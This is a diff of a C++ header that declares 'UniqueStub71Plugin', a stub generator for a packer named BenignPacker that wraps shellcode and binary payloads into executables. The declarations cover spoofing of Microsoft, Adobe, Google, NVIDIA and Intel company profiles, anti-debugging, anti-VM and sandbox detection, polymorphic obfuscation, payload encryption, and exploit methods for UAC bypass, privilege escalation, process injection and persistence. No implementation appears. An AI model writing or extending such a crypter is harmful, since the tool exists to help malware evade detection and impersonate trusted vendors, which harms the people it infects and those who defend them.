@@ -49,61 +49,23 @@ FEATURES:
 #include <sys/ptrace.h>
 #endif
 
-// Forward declarations to avoid circular dependencies
-namespace BenignPacker {
-    class IStubGenerator;
-    class PluginFramework;
-}
+// Include the plugin framework
+#include "PluginFramework/IPlugin.h"
 
 namespace BenignPacker {
 
-// Plugin configuration structure (replaces old StubConfig)
-struct PluginConfig {
-    std::string name;
-    std::string version;
-    std::string description;
-    std::string author;
-    std::vector<std::string> supportedFormats;
-    std::map<std::string, std::string> capabilities;
-    bool requiresAdmin;
-    bool supportsEncryption;
-    bool supportsPolymorphic;
-    bool supportsAntiAnalysis;
-};
-
-// Execution context for plugin operations (new structure)
-struct ExecutionContext {
-    std::string inputFile;
-    std::string outputFile;
-    std::string method;
-    std::map<std::string, std::string> parameters;
-    bool verbose;
-    bool debug;
-    std::vector<std::string> additionalOptions;
-};
-
-// Plugin execution result (new structure)
-struct PluginResult {
-    bool success;
-    std::string message;
-    std::vector<uint8_t> generatedData;
-    std::map<std::string, std::string> metadata;
-    int exitCode;
-    std::string errorDetails;
-};
-
-// Company profile structure for spoofing (new structure)
+// Company profile structure for spoofing
 struct CompanyProfile {
     std::string name;
     std::string certificate;
     std::string description;
     std::string version;
-    std::string copyright;
+    std::string mutexPrefix;
     std::vector<std::string> mutexPrefixes;
     std::map<std::string, std::string> registryKeys;
 };
 
-// Mutex system configuration (new structure)
+// Mutex configuration structure
 struct MutexConfig {
     std::string name;
     std::string pattern;
@@ -113,7 +75,7 @@ struct MutexConfig {
     std::vector<std::string> fallbacks;
 };
 
-// Exploit method configuration (new structure)
+// Exploit method structure
 struct ExploitMethod {
     std::string name;
     std::string description;
@@ -123,44 +85,26 @@ struct ExploitMethod {
     std::map<std::string, std::string> parameters;
 };
 
-// Main Unique Stub 71 Plugin class implementing IStubGenerator (changed base class)
-class UniqueStub71Plugin : public IStubGenerator {
-private:
-    std::mt19937_64 rng;
-    // Plugin state
-    bool initialized;
-    std::map<std::string, std::string> settings;
-    // Advanced features
-    std::vector<CompanyProfile> companyProfiles;
-    std::vector<MutexConfig> mutexSystems;
-    std::vector<ExploitMethod> exploitMethods;
-    // Anti-analysis systems
-    std::vector<std::string> debuggerProcesses;
-    std::vector<std::string> vmIndicators;
-    std::vector<std::string> sandboxTools;
-    // Polymorphic systems
-    std::vector<std::string> variableNames;
-    std::vector<std::string> functionNames;
-    std::vector<std::string> commentTemplates;
-
+// UniqueStub71Plugin class implementation
+class UniqueStub71Plugin : public PluginFramework::IStubGenerator {
 public:
     UniqueStub71Plugin();
-    ~UniqueStub71Plugin();
+    virtual ~UniqueStub71Plugin();
 
-    // IStubGenerator interface implementation (new virtual methods)
-    PluginConfig GetConfig() const override;
+    // IPlugin interface implementation
+    PluginFramework::PluginConfig GetConfig() const override;
     bool Initialize(const std::map<std::string, std::string>& settings) override;
-    PluginResult Execute(const ExecutionContext& context) override;
+    PluginFramework::PluginResult Execute(const PluginFramework::ExecutionContext& context) override;
     std::vector<uint8_t> GenerateStub(const std::vector<uint8_t>& payload) override;
 
-    // Plugin-specific methods (new methods for BenignPacker features)
+    // Plugin-specific methods
     bool LoadCompanyProfiles();
     bool LoadMutexSystems();
     bool LoadExploitMethods();
     bool InitializeAntiAnalysis();
     bool InitializePolymorphic();
 
-    // Stub generation methods (changed return type to std::vector<uint8_t>)
+    // Stub generation methods
     std::vector<uint8_t> GenerateBasicStub(const std::vector<uint8_t>& payload);
     std::vector<uint8_t> GenerateAdvancedStub(const std::vector<uint8_t>& payload);
     std::vector<uint8_t> GenerateMutexStub(const std::vector<uint8_t>& payload);
@@ -199,6 +143,34 @@ public:
     std::string GenerateUniqueIdentifier();
     bool WriteToFile(const std::string& filename, const std::vector<uint8_t>& data);
 
+    // IStubGenerator interface implementation
+    std::vector<uint8_t> GenerateStubWithMethod(const std::vector<uint8_t>& payload, const std::string& method) override;
+    std::vector<std::string> GetAvailableTemplates() override;
+    bool LoadTemplate(const std::string& template_name) override;
+    bool SaveTemplate(const std::string& template_name, const std::string& template_data) override;
+    std::vector<std::string> GetSupportedEncryption() override;
+    bool SetEncryptionMethod(const std::string& method) override;
+    std::vector<uint8_t> EncryptPayload(const std::vector<uint8_t>& payload, const std::string& method) override;
+    bool EnableAntiDebug(bool enable) override;
+    bool EnableAntiVM(bool enable) override;
+    bool EnableTimingChecks(bool enable) override;
+    bool EnableSandboxDetection(bool enable) override;
+    bool SetMutexName(const std::string& mutex_name) override;
+    bool EnableMutexProtection(bool enable) override;
+    std::vector<std::string> GetAvailableMutexes() override;
+    std::vector<std::string> GetAvailableCompanies() override;
+    bool SetCompanyProfile(const std::string& company_name) override;
+    std::string GetCurrentCompany() const override;
+    bool EnablePolymorphic(bool enable) override;
+    bool SetPolymorphicLevel(int level) override;
+    std::vector<std::string> GetAvailableExploits() override;
+    bool EnableExploit(const std::string& exploit_name, bool enable) override;
+
+    // IPlugin lifecycle methods
+    bool OnLoad() override;
+    bool OnUnload() override;
+    void OnError(const std::string& error) override;
+
 private:
     void InitializeRNG();
     void LoadDefaultSettings();
@@ -207,95 +179,62 @@ private:
     std::string GenerateStubMain(const std::vector<uint8_t>& payload);
     std::string GenerateStubFooter();
     std::vector<uint8_t> CompileStub(const std::string& sourceCode);
+
+    // Member variables
+    std::mt19937 rng_;
+    std::map<std::string, CompanyProfile> companyProfiles_;
+    std::map<std::string, MutexConfig> mutexSystems_;
+    std::map<std::string, ExploitMethod> exploitMethods_;
+    std::string currentCompany_;
+    std::string currentMutex_;
+    bool antiDebugEnabled_;
+    bool antiVMEnabled_;
+    bool timingChecksEnabled_;
+    bool polymorphicEnabled_;
+    int polymorphicLevel_;
 };
 
-// Plugin factory functions (changed return type to std::unique_ptr and namespace)
-std::unique_ptr<IStubGenerator> CreateUniqueStub71Plugin();
-void DestroyUniqueStub71Plugin(IStubGenerator* plugin);
+// Plugin factory functions
+std::unique_ptr<PluginFramework::IStubGenerator> CreateUniqueStub71Plugin();
+void DestroyUniqueStub71Plugin(PluginFramework::IStubGenerator* plugin);
 
-// Utility functions for BenignPacker integration (new functions)
+// Utility functions for BenignPacker integration
 std::vector<uint8_t> ConvertBinToExe(const std::vector<uint8_t>& binData);
 std::vector<uint8_t> ApplyCompanyProfile(const std::vector<uint8_t>& exeData, const CompanyProfile& profile);
 std::vector<uint8_t> ApplyMutexProtection(const std::vector<uint8_t>& exeData, const MutexConfig& mutex);
 std::vector<uint8_t> ApplyAntiAnalysis(const std::vector<uint8_t>& exeData);
 std::vector<uint8_t> ApplyPolymorphicObfuscation(const std::vector<uint8_t>& exeData);
 
-// Company profile definitions (new namespaces and extern const)
+// Company profile definitions
 namespace CompanyProfiles {
-    extern const CompanyProfile Microsoft;
-    extern const CompanyProfile Adobe;
-    extern const CompanyProfile Google;
-    extern const CompanyProfile NVIDIA;
-    extern const CompanyProfile Intel;
+    extern const std::map<std::string, CompanyProfile> PROFILES;
 }
 
-// Mutex system definitions (new namespaces and extern const)
+// Mutex system definitions
 namespace MutexSystems {
-    extern const std::vector<MutexConfig> AdvancedMutexes;
-    extern const std::vector<MutexConfig> StealthMutexes;
-    extern const std::vector<MutexConfig> GlobalMutexes;
+    extern const std::map<std::string, MutexConfig> SYSTEMS;
 }
 
-// Exploit method definitions (new namespaces and extern const)
+// Exploit method definitions
 namespace ExploitMethods {
-    extern const std::vector<ExploitMethod> UACBypassMethods;
-    extern const std::vector<ExploitMethod> PrivilegeEscalationMethods;
-    extern const std::vector<ExploitMethod> ProcessInjectionMethods;
-    extern const std::vector<ExploitMethod> PersistenceMethods;
-    extern const std::vector<ExploitMethod> NetworkExploitMethods;
+    extern const std::map<std::string, ExploitMethod> METHODS;
 }
 
-} // namespace BenignPacker
+// Plugin export macros
+#define UNIQUE_STUB_71_API __declspec(dllexport)
 
-// Plugin interface macros (updated description and entry points)
-#define UNIQUE_STUB_71_PLUGIN_VERSION "1.0.0"
-#define UNIQUE_STUB_71_PLUGIN_NAME "UniqueStub71Plugin"
-#define UNIQUE_STUB_71_PLUGIN_DESCRIPTION "Advanced Unique Stub Generation Framework with 71 Variants for BenignPacker Integration"
-
-// Export macros for DLL/shared library
-#ifdef _WIN32
-    #ifdef UNIQUE_STUB_71_EXPORTS
-        #define UNIQUE_STUB_71_API __declspec(dllexport)
-    #else
-        #define UNIQUE_STUB_71_API __declspec(dllimport)
-    #endif
-#else
-    #define UNIQUE_STUB_71_API __attribute__((visibility("default")))
-#endif
-
-// Plugin entry points for BenignPacker integration (changed function names and signatures)
+// Plugin export functions
 extern "C" {
-    UNIQUE_STUB_71_API BenignPacker::IStubGenerator* CreatePlugin();
-    UNIQUE_STUB_71_API void DestroyPlugin(BenignPacker::IStubGenerator* plugin);
-    UNIQUE_STUB_71_API const char* GetPluginVersion();
+    UNIQUE_STUB_71_API PluginFramework::IStubGenerator* CreatePlugin();
+    UNIQUE_STUB_71_API void DestroyPlugin(PluginFramework::IStubGenerator* plugin);
+    UNIQUE_STUB_71_API int GetApiVersion();
     UNIQUE_STUB_71_API const char* GetPluginName();
+    UNIQUE_STUB_71_API const char* GetPluginVersion();
     UNIQUE_STUB_71_API const char* GetPluginDescription();
     UNIQUE_STUB_71_API bool SupportsFormat(const char* format);
     UNIQUE_STUB_71_API bool RequiresAdmin();
-    UNIQUE_STUB_71_API const char* GetSupportedMethods();
 }
 
-// BenignPacker integration specific macros (new macros from the guide)
-#define BENIGN_PACKER_TARGET_SIZE 491793
-#define BENIGN_PACKER_SUCCESS_RATE 100
-#define BENIGN_PACKER_UNIQUE_VARIABLES 250
-#define BENIGN_PACKER_TOTAL_VARIABLES 1367
-#define BENIGN_PACKER_COMPILATION_TIME 30
-#define BENIGN_PACKER_RUNTIME_PERFORMANCE 100
-
-// Supported input formats
-#define SUPPORTED_FORMATS ".bin,.exe,.dll,.raw,.shellcode"
-
-// Available methods
-#define AVAILABLE_METHODS "default,advanced,mutex,stealth"
-
-// Company profiles
-#define COMPANY_PROFILES "Microsoft,Adobe,Google,NVIDIA,Intel"
-
-// Exploit methods count
-#define EXPLOIT_METHODS_COUNT 18
-
-// Mutex systems count
-#define MUTEX_SYSTEMS_COUNT 40
+} // namespace BenignPacker
 
 #endif // UNIQUE_STUB_71_PLUGIN_H
